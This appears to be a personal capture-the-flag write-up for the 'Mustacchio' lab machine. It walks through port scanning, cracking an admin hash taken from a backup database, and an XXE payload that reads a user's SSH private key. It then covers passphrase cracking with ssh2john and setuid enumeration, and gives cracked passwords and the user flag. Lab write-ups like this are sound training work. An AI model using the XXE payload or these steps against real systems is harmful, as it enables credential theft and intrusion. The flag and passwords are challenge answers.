# CTF Journal Entry: Mustacchio (IP: 10.201.90.250)

**Challenge Rating:** Medium  

**Challenge:**  
This machine revolves around reconnaissance, file discovery, web application analysis, cracking hashes, and exploiting XML External Entity (XXE) vulnerabilities to extract sensitive data. It highlights common misconfigurations like accessible backup files, improperly secured SSH keys, and vulnerable XML parsers.

---

## Skills Demonstrated:
- VPN setup for lab access  
- Reconnaissance with Nmap, Zenmap, Rustscan  
- Directory brute-forcing with Gobuster, Feroxbuster, FFUF  
- File analysis (`.bak` → SQLite DB, `strings`, `sqlite3`)  
- Credential extraction & hash cracking with **John the Ripper** and **Hashcat**  
- Login testing with **SSH**, `sshpass`, and `curl`  
- Web enumeration on custom ports (80, 8765)  
- Vulnerability exploitation using **XXE (XML External Entity)**  
- Extracting SSH private keys via XXE payloads  
- Cracking SSH private key passphrase with `ssh2john` + John  
- Privilege escalation enumeration (`strings`, setuid binary analysis)  

---

## Notes

### Initial Recon
- Target: `10.201.90.250`  
- Scanned with Zenmap and Rustscan → Open ports:  
  - **22/tcp SSH**  
  - **80/tcp HTTP**  
  - **8765/tcp HTTP**  

- Website showed filler text, robots.txt blocked (`Disallow: /`).  

### Enumeration
- Ran Gobuster & Feroxbuster → discovered `user.bak`.  
- File was SQLite DB with table `users (username, password)`.  
- Extracted admin hash:  
  ```
  admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
  ```  

- Cracked with John (rockyou.txt):  
  ```
  admin : bulldog19
  ```  

### SSH Attempts
- Tried SSH login with credentials → failed (publickey required).  
- Discovered web login on `http://10.201.90.250:8765`.  
- Logged in using `admin : bulldog19`.  

### Discovery & XXE Exploitation
- Source code hints:  
  ```html
  <!-- Barry, you can now SSH in using your key!-->
  ```  

- Discovered `/auth/dontforget.bak` (XML file).  
- Hints toward XML parsing.  

- Confirmed XXE vulnerability with payloads:  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa">
  ]>
  <r>
    <name>&example;</name>
  </r>
  ```  

- Successfully extracted **Barry’s SSH private key** (encrypted).  

### Cracking SSH Private Key
- Converted key for John:  
  ```bash
  python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```  

- Cracked passphrase: **urieljames**  

- SSH access gained:  
  ```bash
  ssh barry@10.201.90.250 -i id_rsa
  ```  

### User Flag
- Retrieved `user.txt`:  
  ```
  62d77a4d5f97d47c5aa38b3b2651b831
  ```  

### Privilege Escalation Enumeration
- Found `live_log` setuid binary in `/home/joe/`:  
  ```
  Live Nginx Log Reader → calls tail -f /var/log/nginx/access.log
  ```  
- Possible vector for privesc (further analysis needed).  

---

## Takeaways
- Always check for `.bak` and `.db` files → often contain credentials.  
- Don’t overlook custom ports like 8765 → admin panels may hide there.  
- XXE is powerful for **local file disclosure**.  
- SSH private keys may require **passphrase cracking**.  
- Privilege escalation often lies in **setuid binaries**.  

---

